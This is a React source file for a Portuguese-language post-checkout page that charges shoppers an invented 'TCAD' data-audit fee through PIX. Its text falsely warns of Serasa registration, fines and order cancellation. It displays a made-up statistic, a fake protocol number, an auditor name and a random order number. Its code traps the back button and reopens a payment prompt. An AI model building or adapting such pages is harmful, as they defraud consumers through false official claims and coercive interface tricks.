import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { getUrlWithUtm } from "@/utils/utm";
import { toast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";
import {
  Dialog, DialogContent, DialogTitle, DialogDescription,
} from "@/components/ui/dialog";

const TCAD_PRICE = 34.81;
const TCAD_PRICE_CENTS = 3481;

function useCountdown(initial: number) {
  const [seconds, setSeconds] = useState(initial);
  useEffect(() => {
    const interval = setInterval(() => {
      setSeconds((s) => (s <= 0 ? 0 : s - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, []);
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

const Icon = ({ name, className = "", style }: { name: string; className?: string; style?: React.CSSProperties }) => (
  <span className={`material-symbols-outlined ${className}`} style={style}>{name}</span>
);

const Upsell1 = () => {
  const navigate = useNavigate();
  const timer = useCountdown(600);
  const [isLoading, setIsLoading] = useState(false);
  const [popupOpen, setPopupOpen] = useState(false);

  // Load Material Symbols font
  useEffect(() => {
    if (!document.querySelector('link[href*="Material+Symbols"]')) {
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.href = "https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0";
      document.head.appendChild(link);
    }
  }, []);

  // Purchase event already fired in PixPayment — no duplicate here
  useEffect(() => {
    console.log("[TrackingHub] Upsell page loaded — Purchase already sent from PixPayment");
  }, []);

  const orderDataStr = sessionStorage.getItem("orderData");
  const orderData = orderDataStr ? JSON.parse(orderDataStr) : null;
  const customer = orderData?.customer || {
    name: "Cliente",
    email: "cliente@email.com",
    phone: "00000000000",
    cpf: "00000000000",
  };
  const [orderNumber] = useState(() => Math.floor(Math.random() * 9000000000) + 1000000000);

  // Prevent back navigation
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => {
      setPopupOpen(true);
      window.history.pushState(null, "", window.location.href);
    };
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  const handleGeneratePix = async () => {
    if (isLoading) return;
    if (!customer) {
      console.error("No customer data in sessionStorage");
      toast({ title: "Erro", description: "Dados do pedido não encontrados. Volte ao checkout.", variant: "destructive" });
      return;
    }
    setIsLoading(true);

    try {
      const payload = {
        amount: TCAD_PRICE_CENTS,
        customer: {
          name: customer.name,
          email: customer.email,
          phone: customer.phone,
          cpf: customer.cpf,
        },
        items: [
          {
            id: "tcad-auditoria",
            title: "TCAD - Taxa de Consolidação e Auditoria de Dados",
            unitPrice: TCAD_PRICE_CENTS,
            quantity: 1,
            tangible: false,
          },
        ],
        shipping: {
          name: customer.name,
          address: { street: "", streetNumber: "", neighborhood: "", city: "", state: "", zipcode: "", country: "br" },
          fee: 0,
        },
        metadata: JSON.stringify({
          type: "upsell_tcad",
          originalOrder: orderData?.product,
          tracking: {},
        }),
      };

      const { data, error } = await supabase.functions.invoke("create-pix", { body: payload });

      if (error || !data || data?.error) {
        const errMsg = data?.details?.message || data?.error || error?.message || "Tente novamente.";
        toast({ title: "Erro ao gerar PIX", description: typeof errMsg === "string" ? errMsg : JSON.stringify(errMsg), variant: "destructive" });
        setIsLoading(false);
        return;
      }

      sessionStorage.setItem("pixData", JSON.stringify(data));
      sessionStorage.setItem("pixReturnTo", "/taxa-alfandega");
      navigate(getUrlWithUtm("/pix"));
    } catch (err) {
      console.error("Upsell PIX error:", err);
      toast({ title: "Erro inesperado", description: "Tente novamente.", variant: "destructive" });
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen" style={{ background: "#f0f2f5", color: "#1a1a2e", fontFamily: "'Inter', 'Segoe UI', sans-serif" }}>
      <div className="mx-auto max-w-[640px] px-4 py-0">

        {/* Header */}
        <header className="flex items-center justify-between py-4 px-4 rounded-xl mt-4" style={{ background: "#ffffff", border: "1px solid #e0e0e0", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
          <div className="flex items-center gap-3">
            <img src="/images/logo-tcad.webp" alt="Logotipo institucional" className="h-10 w-auto object-contain" />
            <div>
              <p className="text-xs font-semibold uppercase tracking-wide" style={{ color: "#555" }}>Setor de Consolidação e Auditoria de Dados</p>
              <p className="text-[10px]" style={{ color: "#999" }}>Pedido #{orderNumber} • Uso Interno</p>
            </div>
          </div>
          <div className="flex items-center gap-1.5 rounded-md px-3 py-1.5" style={{ border: "1px solid #d29922", background: "rgba(210,153,34,0.08)" }}>
            <Icon name="fact_check" style={{ color: "#d29922", fontSize: "16px" }} />
            <span className="text-[10px] font-bold uppercase" style={{ color: "#d29922" }}>TCAD pendente</span>
          </div>
        </header>

        {/* Progress Steps */}
        <section className="mt-4 rounded-xl p-5" style={{ background: "#fff", border: "1px solid #e0e0e0", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
          <div className="flex items-center gap-3 mb-5">
            <Icon name="playlist_add_check" style={{ color: "#1a73e8", fontSize: "22px" }} />
            <div>
              <p className="text-sm font-bold" style={{ color: "#1a1a2e" }}>Fluxo de liberação</p>
              <p className="text-[10px]" style={{ color: "#999" }}>Atualização automática do setor logístico</p>
            </div>
          </div>

          <div className="space-y-4 relative ml-4">
            <div className="absolute left-4 top-0 bottom-0 w-px" style={{ background: "#e0e0e0" }} />

            <div className="flex items-center gap-4 relative">
              <div className="flex h-8 w-8 items-center justify-center rounded-full z-10 flex-shrink-0" style={{ background: "rgba(34,197,94,0.12)" }}>
                <Icon name="verified" style={{ color: "#16a34a", fontSize: "18px" }} />
              </div>
              <div>
                <p className="text-sm font-semibold" style={{ color: "#1a1a2e" }}>NF-e emitida</p>
                <p className="text-[10px]" style={{ color: "#999" }}>Documento fiscal autenticado</p>
              </div>
            </div>

            <div className="flex items-center gap-4 relative">
              <div className="flex h-8 w-8 items-center justify-center rounded-full z-10 flex-shrink-0" style={{ background: "rgba(210,153,34,0.12)" }}>
                <Icon name="rule" style={{ color: "#d29922", fontSize: "18px" }} />
              </div>
              <div>
                <p className="text-sm font-semibold" style={{ color: "#d29922" }}>Auditoria de Dados</p>
                <p className="text-[10px]" style={{ color: "#999" }}>Aguardando conclusão da TCAD</p>
              </div>
            </div>

            <div className="flex items-center gap-4 relative opacity-40">
              <div className="flex h-8 w-8 items-center justify-center rounded-full z-10 flex-shrink-0" style={{ background: "rgba(0,0,0,0.05)" }}>
                <Icon name="lock_clock" style={{ color: "#999", fontSize: "18px" }} />
              </div>
              <div>
                <p className="text-sm font-semibold" style={{ color: "#777" }}>Envio em andamento</p>
                <p className="text-[10px]" style={{ color: "#999" }}>Pausado até finalizar auditoria</p>
              </div>
            </div>
          </div>
        </section>

        {/* Alert */}
        <section className="mt-4 rounded-xl p-5" style={{ background: "#fff", border: "1px solid #d29922", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
          <div className="flex items-center gap-2 mb-4">
            <Icon name="warning" style={{ color: "#d29922", fontSize: "22px" }} />
            <h1 className="text-base font-bold" style={{ color: "#1a1a2e" }}>Pendência de Consolidação do Pedido</h1>
          </div>

          <div className="space-y-3 text-sm leading-relaxed" style={{ color: "#555" }}>
            <p>Sua Nota Fiscal Eletrônica já foi emitida com sucesso.</p>
            <p>Agora, antes da liberação para envio, é necessário concluir a <strong style={{ color: "#1a1a2e" }}>TCAD – Taxa de Consolidação e Auditoria de Dados</strong>.</p>
            <p>Esse procedimento finaliza a auditoria manual dos dados preenchidos no momento da compra para evitar:</p>

            <ul className="space-y-2 mt-2 ml-1">
              <li className="flex items-start gap-2"><span style={{ color: "#dc2626" }}>•</span> Registro no Serasa por inconsistência irregular</li>
              <li className="flex items-start gap-2"><span style={{ color: "#dc2626" }}>•</span> Dados inconsistentes no sistema logístico</li>
              <li className="flex items-start gap-2"><span style={{ color: "#dc2626" }}>•</span> Multas no nome por pendência ativa</li>
              <li className="flex items-start gap-2"><span style={{ color: "#dc2626" }}>•</span> Atrasos no envio</li>
            </ul>
          </div>

          <div className="mt-5 flex items-start gap-3 rounded-lg p-4" style={{ background: "rgba(210,153,34,0.06)", border: "1px solid rgba(210,153,34,0.25)" }}>
            <Icon name="hourglass_top" className="flex-shrink-0 mt-0.5" style={{ color: "#d29922", fontSize: "22px" }} />
            <div className="text-sm">
              <p className="font-bold" style={{ color: "#1a1a2e" }}>Seu pedido está aguardando essa confirmação.</p>
              <p className="mt-1" style={{ color: "#555" }}>
                Sem a TCAD, o pedido permanece <strong style={{ color: "#1a1a2e" }}>em análise manual</strong> e corre risco de{" "}
                <strong style={{ color: "#1a1a2e" }}>cancelamento automático por inconsistência de dados</strong>.
              </p>
            </div>
          </div>
        </section>

        {/* Insight */}
        <section className="mt-4 rounded-xl p-5" style={{ background: "#fff", border: "1px solid #e0e0e0", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
          <div className="flex items-start gap-2 mb-4">
            <Icon name="manage_search" className="flex-shrink-0" style={{ color: "#1a73e8", fontSize: "22px" }} />
            <p className="text-sm" style={{ color: "#555" }}>
              Mais de <strong style={{ color: "#1a1a2e" }}>87% dos pedidos</strong> são devolvidos por erro de digitação ou inconsistência nos dados fornecidos.
            </p>
          </div>

          <p className="text-sm mb-4" style={{ color: "#555" }}>
            Com a TCAD, um operador faz uma <strong style={{ color: "#1a1a2e" }}>validação interna completa</strong>, garantindo:
          </p>

          <ul className="space-y-3">
            <li className="flex items-center gap-3 text-sm" style={{ color: "#1a1a2e" }}>
              <Icon name="task_alt" style={{ color: "#16a34a", fontSize: "20px" }} />
              Correção automática de informações
            </li>
            <li className="flex items-center gap-3 text-sm" style={{ color: "#1a1a2e" }}>
              <Icon name="bolt" style={{ color: "#d29922", fontSize: "20px" }} />
              Liberação imediata para expedição
            </li>
            <li className="flex items-center gap-3 text-sm" style={{ color: "#1a1a2e" }}>
              <Icon name="local_shipping" style={{ color: "#1a73e8", fontSize: "20px" }} />
              Prioridade no processamento logístico
            </li>
          </ul>

          <p className="text-sm font-bold mt-5" style={{ color: "#1a1a2e" }}>
            Esta é a <strong>última etapa antes do envio.</strong>
          </p>
        </section>

        {/* Badges */}
        <div className="grid grid-cols-2 gap-2 mt-4">
          {[
            { icon: "verified", label: "Selo de autenticação" },
            { icon: "rule", label: "Auditoria manual" },
            { icon: "task_alt", label: "Verificação interna" },
            { icon: "inventory", label: "Registro interno" },
          ].map((b, i) => (
            <div key={i} className="flex items-center gap-2 rounded-lg px-3 py-3" style={{ background: "#fff", border: "1px solid #e0e0e0" }}>
              <Icon name={b.icon} style={{ color: "#1a73e8", fontSize: "18px" }} />
              <span className="text-xs font-medium" style={{ color: "#555" }}>{b.label}</span>
            </div>
          ))}
        </div>

        {/* CTA */}
        <section className="mt-4 mb-6 rounded-xl p-5" style={{ background: "#fff", border: "1px solid #e0e0e0", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
          <div className="rounded-lg p-4 mb-5 text-center" style={{ background: "rgba(26,115,232,0.04)", border: "1px solid rgba(26,115,232,0.15)" }}>
            <p className="text-[10px] uppercase tracking-widest font-bold mb-2" style={{ color: "#1a73e8" }}>Protocolo interno</p>
            <p className="text-xs" style={{ color: "#777" }}>Registro 2025/TCAD-993</p>
            <p className="text-xs" style={{ color: "#777" }}>Auditor responsável: <strong style={{ color: "#1a1a2e" }}>D. Medeiros</strong></p>
            <p className="text-xs" style={{ color: "#777" }}>Disponível para consulta até 23h59</p>
          </div>

          <button
            onClick={handleGeneratePix}
            disabled={isLoading}
            className="w-full font-bold text-base py-4 rounded-xl transition-all active:scale-[0.98] disabled:opacity-70"
            style={{
              background: "linear-gradient(135deg, #22c55e 0%, #16a34a 100%)",
              color: "#ffffff",
              border: "none",
              cursor: isLoading ? "wait" : "pointer",
              boxShadow: "0 2px 12px rgba(22,163,74,0.35)",
            }}
          >
            {isLoading ? (
              <span className="flex items-center justify-center gap-2"><Loader2 className="h-5 w-5 animate-spin" /> Gerando PIX...</span>
            ) : (
              "Finalizar Auditoria e Liberar Envio"
            )}
          </button>
          <p className="text-[10px] text-center mt-3" style={{ color: "#999" }}>
            Confirmação registrada automaticamente e liberação imediata do envio.
          </p>
        </section>
      </div>

      {/* Back Prevention Popup */}
      <Dialog open={popupOpen} onOpenChange={setPopupOpen}>
        <DialogContent className="sm:max-w-sm rounded-2xl p-6 text-center" style={{ background: "#fff", border: "1px solid #e0e0e0" }}>
          <DialogDescription className="sr-only">Aviso TCAD</DialogDescription>
          <div className="flex flex-col items-center">
            <div className="flex h-14 w-14 items-center justify-center rounded-full mb-4" style={{ background: "rgba(210,153,34,0.1)" }}>
              <Icon name="warning" style={{ color: "#d29922", fontSize: "28px" }} />
            </div>
            <DialogTitle className="text-lg font-bold mb-2" style={{ color: "#1a1a2e" }}>Aviso TCAD</DialogTitle>
            <p className="text-sm mb-5" style={{ color: "#555" }}>
              Finalize a taxa de consolidação para liberar o pedido. Sem essa confirmação o envio fica retido.
            </p>
            <button
              onClick={() => setPopupOpen(false)}
              className="w-full mb-2 rounded-xl py-3 text-sm font-medium transition-all"
              style={{ background: "transparent", border: "1px solid #e0e0e0", color: "#555" }}
            >
              Permanecer na página
            </button>
            <button
              onClick={() => {
                setPopupOpen(false);
                handleGeneratePix();
              }}
              className="w-full rounded-xl py-3 text-sm font-bold transition-all"
              style={{ background: "linear-gradient(135deg, #22c55e 0%, #16a34a 100%)", color: "#ffffff", border: "none" }}
            >
              Efetuar pagamento da TCAD
            </button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Upsell1;
